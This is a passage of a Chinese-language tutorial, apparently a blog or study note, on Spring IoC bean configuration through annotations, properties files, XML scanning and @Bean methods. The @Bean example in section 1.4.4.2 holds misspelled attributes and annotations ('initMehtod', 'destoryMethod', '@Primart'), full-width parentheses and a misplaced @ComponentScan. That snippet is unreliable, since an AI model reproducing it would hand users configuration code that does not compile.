class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@Component</span>(<span class="hljs-string">&quot;myBean1&quot;</span>) <span class="hljs-comment">// 必填项，标注 Bean 类和指定 ID，若未指定 ID，默认为类名的首字母小写形式（不是全类名）</span><br><span class="hljs-variable">@Scope</span>(<span class="hljs-string">&quot;prototype&quot;</span>)   <span class="hljs-comment">// 指定作用域，默认为单例(singleton)</span><br><span class="hljs-variable">@Lazy</span>                 <span class="hljs-comment">// 延迟加载，默认不开启，设置为 true 则会在第一次访问时创建 Bean</span><br><span class="hljs-variable">@DependsOn</span>(<span class="hljs-string">&quot;myBean2&quot;</span>) <span class="hljs-comment">// 指定依赖的其他 Bean，确保 myBean2 初始化完成后再实例化当前 Bean</span><br><span class="hljs-variable">@Primary</span>              <span class="hljs-comment">// 根据类型装配时，若有多个实现，该 Bean 为主要候选者</span><br>public class MyBean &#123;<br><br>    <span class="hljs-comment">// @PostConstruct：初始化方法，依赖注入完成后自动调用</span><br>    <span class="hljs-variable">@PostConstruct</span><br>    public void <span class="hljs-built_in">initMethod</span>() &#123;<br>        <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.out</span><span class="hljs-selector-class">.println</span>(<span class="hljs-string">&quot;MyBean initialized with all dependencies.&quot;</span>);<br>        <span class="hljs-comment">// 可以在这里放置资源初始化逻辑</span><br>    &#125;<br><br>    <span class="hljs-comment">// @PreDestroy：销毁方法，在 Bean 被容器销毁前调用</span><br>    @<span class="hljs-selector-tag">PreDestroy</span><br>    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">void</span> <span class="hljs-selector-tag">cleanup</span>() &#123;<br>        <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.out</span><span class="hljs-selector-class">.println</span>(<span class="hljs-string">&quot;MyBean is being destroyed. Cleaning up resources.&quot;</span>);<br>        <span class="hljs-comment">// 可以在这里执行清理操作</span><br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure></li></ul><hr><h6 id="1-4-3-2、配置属性注入"><a href="#1-4-3-2、配置属性注入" class="headerlink" title="1.4.3.2、配置属性注入"></a>1.4.3.2、配置属性注入</h6><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBean</span> &#123;<br><br>    <span class="hljs-comment">// @Autowired：实现按类型自动装配（byType）</span><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> MyRepository myRepository;<br>    <br>    <span class="hljs-comment">// @Autowired + @Qualifier：实现按名称自动装配（byName）</span><br><span class="hljs-meta">@Autowired</span><br>    <span class="hljs-meta">@Qualifier(<span class="hljs-string">&quot;specificRepository&quot;</span>)</span> <span class="hljs-comment">// 指定注入名称</span><br>    <span class="hljs-keyword">private</span> MyRepository specificRepository;<br>    <br>    <span class="hljs-comment">// @Resource：先按名称装配（byName），再按类型装配（byType）</span><br><span class="hljs-meta">@Resource(name = <span class="hljs-string">&quot;specificService&quot;</span>)</span> <br>    <span class="hljs-keyword">private</span> MyService myService;<br>    <br>    <span class="hljs-comment">// 1. 对象类型</span><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> Object userDao;<br>    <br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> Object bankDao;<br>    <br>    <span class="hljs-comment">// 2. 简单数组</span><br>    <span class="hljs-meta">@Value(<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;ages&#125;</span>&quot;</span>)</span><br>    <span class="hljs-keyword">private</span> int[] ages; <span class="hljs-comment">// 一维数组</span><br><br>    <span class="hljs-meta">@Value(<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;ages2D&#125;</span>&quot;</span>)</span><br>    <span class="hljs-keyword">private</span> int[][] ages2D; <span class="hljs-comment">// 二维数组</span><br>    <br>    <span class="hljs-comment">// 3. 复杂数组</span><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> Object[] womens; <span class="hljs-comment">// 一维数组</span><br>    <br>    <span class="hljs-meta">@Value(<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;womens2D&#125;</span>&quot;</span>)</span>  <br>    <span class="hljs-keyword">private</span> Object[][] womens2D;  <span class="hljs-comment">// 二维数组</span><br>    <br>    <span class="hljs-comment">// 4. 简单 List 集合</span><br>    <span class="hljs-meta">@Value(<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;ageList&#125;</span>&quot;</span>)</span><br>    <span class="hljs-keyword">private</span> List&lt;Integer&gt; ageList;<br>    <br>    <span class="hljs-comment">// 5. 复杂 List 集合</span><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> List&lt;Object&gt; womenList; <br>    <br>    <span class="hljs-comment">// 6. 简单 Set 集合</span><br>    <span class="hljs-meta">@Value(<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;ageSet&#125;</span>&quot;</span>)</span><br>    <span class="hljs-keyword">private</span> Set&lt;Integer&gt; ageSet; <br>    <br>    <span class="hljs-comment">// 7. 复杂 Set 集合</span><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> Set&lt;ComplexObject&gt; womenSet; <br>    <br><span class="hljs-comment">// 8. 简单 Map 集合</span><br>    <span class="hljs-meta">@Value(<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;ageMap&#125;</span>&quot;</span>)</span><br>    <span class="hljs-keyword">private</span> Map&lt;String, Integer&gt; ageMap; <br>    <br>    <span class="hljs-comment">// 9. 复杂 Map 集合</span><br><span class="hljs-meta">@Value(<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;phones&#125;</span>&quot;</span>)</span><br>    <span class="hljs-keyword">private</span> Map&lt;String, Object&gt; phones; <br>    <br><span class="hljs-comment">// 10. 简单数据类型</span><br>    <br>    <span class="hljs-comment">// 10.1 基本数据类型</span><br>    <span class="hljs-meta">@Value(<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;age&#125;</span>&quot;</span>)</span>  <br>    <span class="hljs-keyword">private</span> int age;  <br>    <br>    <span class="hljs-meta">@Value(<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;isActive&#125;</span>&quot;</span>)</span> <br>    <span class="hljs-keyword">private</span> boolean isActive; <br>    <br>    <span class="hljs-meta">@Value(<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;balance&#125;</span>&quot;</span>)</span>  <br>    <span class="hljs-keyword">private</span> double balance;  <br>    <br>    <span class="hljs-meta">@Value(<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;grade&#125;</span>&quot;</span>)</span>  <br>    <span class="hljs-keyword">private</span> char grade; <br>    <br>    <span class="hljs-meta">@Value(<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;id&#125;</span>&quot;</span>)</span>  <br>    <span class="hljs-keyword">private</span> long id;  <br>    <br>    <span class="hljs-meta">@Value(<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;weight&#125;</span>&quot;</span>)</span>  <br>    <span class="hljs-keyword">private</span> float weight; <br>    <br>    <span class="hljs-comment">// 10.2 包装类型</span><br>    <span class="hljs-meta">@Value(<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;ageWrapper&#125;</span>&quot;</span>)</span>  <br>    <span class="hljs-keyword">private</span> Integer ageWrapper;  <br>    <br>    <span class="hljs-meta">@Value(<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;isActiveWrapper&#125;</span>&quot;</span>)</span>  <br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">Boolean</span> isActiveWrapper;  <br>    <br>    <span class="hljs-meta">@Value(<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;balanceWrapper&#125;</span>&quot;</span>)</span> <br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">Double</span> balanceWrapper; <br>    <br>    <span class="hljs-meta">@Value(<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;gradeWrapper&#125;</span>&quot;</span>)</span>  <br>    <span class="hljs-keyword">private</span> Character gradeWrapper;  <br>    <br>    <span class="hljs-meta">@Value(<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;idWrapper&#125;</span>&quot;</span>)</span> <br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">Long</span> idWrapper; <br>    <br>    <span class="hljs-meta">@Value(<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;weightWrapper&#125;</span>&quot;</span>)</span>  <br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">Float</span> weightWrapper; <br>    <br>    <span class="hljs-comment">// 10.3 字符串类型</span><br>    <span class="hljs-meta">@Value(<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;name&#125;</span>&quot;</span>)</span>  <br>    <span class="hljs-keyword">private</span> String name;  <br>&#125;<br></code></pre></td></tr></table></figure><hr><h6 id="1-4-3-3、配置外部-properties-文件"><a href="#1-4-3-3、配置外部-properties-文件" class="headerlink" title="1.4.3.3、配置外部 properties 文件"></a>1.4.3.3、配置外部 properties 文件</h6><p>如果需要为基本数据类型及其集合进行注入，通常会通过配置外部 <code>properties</code> 文件，并将相应的属性值写入该文件中。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># 1. 对象类型</span><br><span class="hljs-attr">userDao</span>=com.example.UserDao<br><span class="hljs-attr">bankDao</span>=com.example.BankDao<br><br><span class="hljs-comment"># 2. 简单数组</span><br><span class="hljs-attr">ages</span>=<span class="hljs-number">25</span>,<span class="hljs-number">30</span>,<span class="hljs-number">35</span> <br><span class="hljs-attr">ages2D</span>=<span class="hljs-number">25</span>,<span class="hljs-number">30</span>|<span class="hljs-number">35</span>,<span class="hljs-number">40</span> //&#123;<span class="hljs-number">25</span>,<span class="hljs-number">30</span>&#125; &#123;<span class="hljs-number">35</span>,<span class="hljs-number">40</span>&#125;<br><br><span class="hljs-comment"># 3. 复杂数组</span><br><span class="hljs-attr">womens</span>=Jane,Alice,Mary,Emily<br><span class="hljs-attr">womens2D</span>=Jane,Alice|Mary,Emily<br><br><span class="hljs-comment"># 4. 简单 List 集合</span><br><span class="hljs-attr">ageList</span>=<span class="hljs-number">25</span>,<span class="hljs-number">30</span>,<span class="hljs-number">35</span><br><br><span class="hljs-comment"># 5. 复杂 List 集合</span><br><span class="hljs-attr">womenList</span>=Jane,Alice,Mary,Emily<br><br><span class="hljs-comment"># 6. 简单 Set 集合</span><br><span class="hljs-attr">ageSet</span>=<span class="hljs-number">25</span>,<span class="hljs-number">30</span>,<span class="hljs-number">35</span><br><br><span class="hljs-comment"># 7. 复杂 Set 集合</span><br><span class="hljs-attr">womenSet</span>=Jane,Alice,Mary,Emily<br><br><span class="hljs-comment"># 8. 简单 Map 集合</span><br><span class="hljs-attr">ageMap</span>=age1:<span class="hljs-number">25</span>,age2:<span class="hljs-number">30</span>,age3:<span class="hljs-number">35</span><br><br><span class="hljs-comment"># 9. 复杂 Map 集合</span><br><span class="hljs-attr">phones</span>=home:<span class="hljs-number">1234567890</span>,<span class="hljs-literal">off</span>ice:<span class="hljs-number">0987654321</span><br><br><span class="hljs-comment"># 10. 简单数据类型</span><br><br><span class="hljs-comment">#10.1 基本数据类型</span><br><span class="hljs-attr">age</span>=<span class="hljs-number">25</span><br><span class="hljs-attr">isActive</span>=<span class="hljs-literal">true</span><br><span class="hljs-attr">balance</span>=<span class="hljs-number">99.99</span><br><span class="hljs-attr">grade</span>=A<br><span class="hljs-attr">id</span>=<span class="hljs-number">12345</span><br><span class="hljs-attr">weight</span>=<span class="hljs-number">70.5</span><br><br><span class="hljs-comment"># 10.2 包装类型</span><br><span class="hljs-attr">ageWrapper</span>=<span class="hljs-number">30</span><br><span class="hljs-attr">isActiveWrapper</span>=<span class="hljs-literal">false</span><br><span class="hljs-attr">balanceWrapper</span>=<span class="hljs-number">200.75</span><br><span class="hljs-attr">gradeWrapper</span>=B<br><span class="hljs-attr">idWrapper</span>=<span class="hljs-number">67890</span><br><span class="hljs-attr">weightWrapper</span>=<span class="hljs-number">80.5</span><br><br><span class="hljs-comment"># 10.3 字符串类型</span><br><span class="hljs-attr">name</span>=John Doe<br></code></pre></td></tr></table></figure><hr><h6 id="1-4-3-4、扫描-Bean-对象-加载外部-properties-文件"><a href="#1-4-3-4、扫描-Bean-对象-加载外部-properties-文件" class="headerlink" title="1.4.3.4、扫描 Bean 对象 + 加载外部 properties 文件"></a>1.4.3.4、扫描 Bean 对象 + 加载外部 properties 文件</h6><p>&#x3D;&#x3D;1.XML 配置文件 扫描方式&#x3D;&#x3D;</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 加载外部 properties 文件 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">context:property-placeholder</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;classpath:application.properties,classpath:myconfig-config.properties&quot;</span> /&gt;</span><br><br><span class="hljs-comment">&lt;!-- 扫描包 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">context:component-scan</span> <span class="hljs-attr">base-package</span>=<span class="hljs-string">&quot;com.example&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.配置类 扫描方式&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs j">@Configuration<br>@ComponentScan(basePackages = &quot;com.example&quot;) // 扫描包<br>@PropertySource(&#123;&quot;classpath:application.properties&quot;, &quot;classpath:myconfig.properties&quot;&#125;) // 加载外部 properties 文件<br>public class ApplicationContextConfig &#123;<br>......<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：关于 properties 文件</p><ol><li>如果有多个 <code>properties</code> 文件，要确保文件加载的顺序，因为 Spring 会按顺序加载文件，后加载的文件会覆盖前面文件中相同的属性值。例如，<code>application.properties</code> 文件中的某个配置值如果在 <code>myconfig.properties</code> 中被重新定义，后者的值会覆盖前者。</li></ol></blockquote><hr><h5 id="1-4-4、配置方式3：配置类-注解-扫描-配置方式"><a href="#1-4-4、配置方式3：配置类-注解-扫描-配置方式" class="headerlink" title="1.4.4、配置方式3：配置类 +注解 + 扫描 配置方式"></a>1.4.4、配置方式3：配置类 +注解 + 扫描 配置方式</h5><h6 id="1-4-4-1、创建-Spring-IOC-配置类"><a href="#1-4-4-1、创建-Spring-IOC-配置类" class="headerlink" title="1.4.4.1、创建 Spring IOC 配置类"></a>1.4.4.1、创建 Spring IOC 配置类</h6><p>创建配置类 <code>ApplicationContextConfig</code>，并使用 <code>@Configuration</code> 标注此类为一个配置类。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl">// ApplicationContextConfig.java<br><br><span class="hljs-variable">@Configuration</span> // 表名这是个配置类<br>public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ApplicationContextConfig</span> </span>&#123;<br>......<br>&#125;<br></code></pre></td></tr></table></figure><hr><h6 id="1-4-4-2、声明-Bean-对象，并配置属性注入-组件扫描"><a href="#1-4-4-2、声明-Bean-对象，并配置属性注入-组件扫描" class="headerlink" title="1.4.4.2、声明 Bean 对象，并配置属性注入 + 组件扫描"></a>1.4.4.2、声明 Bean 对象，并配置属性注入 + 组件扫描</h6><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@Configuration</span> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApplicationContextConfig</span> &#123;<br><br><span class="hljs-meta">@Bean</span>（                 <span class="hljs-comment">// 必填项，表示返回的结果是一个 Bean</span><br>    name=<span class="hljs-string">&quot;myService&quot;</span>,       <span class="hljs-comment">// 指定 Bean 的id，可省略，默认首字母小写</span><br>    initMehtod=<span class="hljs-string">&quot;init&quot;</span>,      <span class="hljs-comment">// 初始化方法，该方法会在依赖注入完成后自动调用</span><br>    destoryMethod=<span class="hljs-string">&quot;cleanup&quot;</span> <span class="hljs-comment">// 销毁方法，该方法会销毁 Bean 之前自动调用</span><br>    ）<br>    <span class="hljs-meta">@ComponentScan</span>(basePackages = <span class="hljs-string">&quot;com.example&quot;</span>) <span class="hljs-comment">// 扫描包</span><br><span class="hljs-meta">@Lazy</span>                   <span class="hljs-comment">// 懒加载，默认不开启</span><br>    <span class="hljs-meta">@Scope</span>(<span class="hljs-string">&quot;prototype&quot;</span>)     <span class="hljs-comment">// 指定作用域</span><br>    <span class="hljs-meta">@DependsOn</span>(<span class="hljs-string">&quot;myRepository&quot;</span>) <span class="hljs-comment">// 指定初始化顺序，在 myRepository 之后进行实例化</span><br>    <span class="hljs-meta">@Primart</span>                <span class="hljs-comment">// 根据类型装配时，若有多个实现，该 Bean 为主要候选者</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">MyService</span> <span class="hljs-title function_">myService</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 手动使用构造方法 new Bean 实例</span><br>    <span class="hljs-comment">// 配置该实例的属性注入</span><br>    <span class="hljs-comment">// 最后返回该实例</span><br>    &#125;<br>    <br><span class="hljs-comment">// 1. 声明 Bean 对象</span><br><span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">QianDaYe</span> <span class="hljs-title function_">qianDaYe</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 2. 手动使用构造方法 new Bean 实例</span><br>        <span class="hljs-title class_">QianDaYe</span> qianDaYe = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QianDaYe</span>();<br>        <span class="hljs-comment">// 3. 配置该实例的属性注入</span><br>        qianDaYe.<span class="hljs-title function_">setUserDao</span>(<span class="hljs-title function_">userDao</span>());<br>        qianDaYe.<span class="hljs-title function_">setBankDao</span>(<span class="hljs-title function_">bankDao</span>());<br>        qianDaYe.<span class="hljs-title function_">setWomens</span>(<span class="hljs-title function_">womens</span>());<br>        qianDaYe.<span class="hljs-title function_">setWomens2D</span>(<span class="hljs-title function_">womens2D</span>());<br>        qianDaYe.<span class="hljs-title function_">setWomenList</span>(<span class="hljs-title function_">womenList</span>());<br>        qianDaYe.<span class="hljs-title function_">setWomenSet</span>(<span class="hljs-title function_">womenSet</span>());<br>        qianDaYe.<span class="hljs-title function_">setPhones</span>(<span class="hljs-title function_">phones</span>());<br>        <span class="hljs-comment">// 4. 最后返回该实例</span><br>        <span class="hljs-keyword">return</span> qianDaYe;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 2. 声明复杂数组 Bean</span><br>    <span class="hljs-comment">// 2.1 声明复杂一维数组 Bean</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span>[] <span class="hljs-title function_">womens</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>        <span class="hljs-title function_">bean1</span>(), <span class="hljs-title function_">bean2</span>(), <span class="hljs-title function_">bean3</span>()<br>        &#125;;<br>&#125;<br><span class="hljs-comment">// 2.2 声明复杂二维数组 Bean</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span>[][] <span class="hljs-title function_">womens2D</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[][]&#123;<br>            &#123;<span class="hljs-title function_">bean1</span>(), <span class="hljs-title function_">bean2</span>()&#125;,<br>            &#123;<span class="hljs-title function_">bean3</span>(), <span class="hljs-title function_">bean4</span>()&#125;<br>        &#125;;<br>    &#125;<br><br>    <span class="hljs-comment">// 3. 声明复杂 List 类型 Bean</span><br><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Object</span>&gt; <span class="hljs-title function_">womenList</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Object</span>&gt; womenList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(); <br>    womenList.<span class="hljs-title function_">add</span>(<span class="hljs-title function_">bean1</span>()); <br>    womenList.<span class="hljs-title function_">add</span>(<span class="hljs-title function_">bean2</span>());<br>    womenList.<span class="hljs-title function_">add</span>(<span class="hljs-title function_">bean3</span>());<br>    <span class="hljs-keyword">return</span> womenList;<br>&#125;<br><br>    <span class="hljs-comment">// 4. 声明复杂 Set 类型 Bean</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Set</span>&lt;<span class="hljs-title class_">Object</span>&gt; <span class="hljs-title function_">womenSet</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">Set</span>&lt;<span class="hljs-title class_">Object</span>&gt; womenSet = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();<br>        womenSet.<span class="hljs-title function_">add</span>(<span class="hljs-title function_">bean1</span>());<br>        womenSet.<span class="hljs-title function_">add</span>(<span class="hljs-title function_">bean2</span>());<br>        womenSet.<span class="hljs-title function_">add</span>(<span class="hljs-title function_">bean3</span>());<br>        <span class="hljs-keyword">return</span> womenSet;<br>    &#125;<br><br>    <span class="hljs-comment">// 5. 声明复杂 Map 类型 Bean</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Object</span>&gt; <span class="hljs-title function_">phones</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Object</span>&gt; phones = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-comment">// 若值是对象</span><br>        phones.<span class="hljs-title function_">put</span>(<span class="hljs-string">&quot;home&quot;</span>, <span class="hljs-title function_">anotherBean</span>());<br>        <span class="hljs-comment">// 若值是 List 集合</span><br>        phones.<span class="hljs-title function_">put</span>(<span class="hljs-string">&quot;work&quot;</span>, <span class="hljs-title class_">Arrays</span>.<span class="hljs-title function_">asList</span>(<span class="hljs-string">&quot;Item1&quot;</span>, <span class="hljs-string">&quot;Item2&quot;</span>, <span class="hljs-string">&quot;Item3&quot;</span>));<br>        <span class="hljs-comment">// 若值是 Set 集合</span><br>        phones.<span class="hljs-title function_">put</span>(<span class="hljs-string">&quot;mobileSet&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;(<span class="hljs-title class_">Arrays</span>.<span class="hljs-title function_">asList</span>(<span class="hljs-string">&quot;Value1&quot;</span>, <span class="hljs-string">&quot;Value2&quot;</span>, <span class="hljs-string">&quot;Value3&quot;</span>)));<br>        <span class="hljs-keyword">return</span> phones;<br>    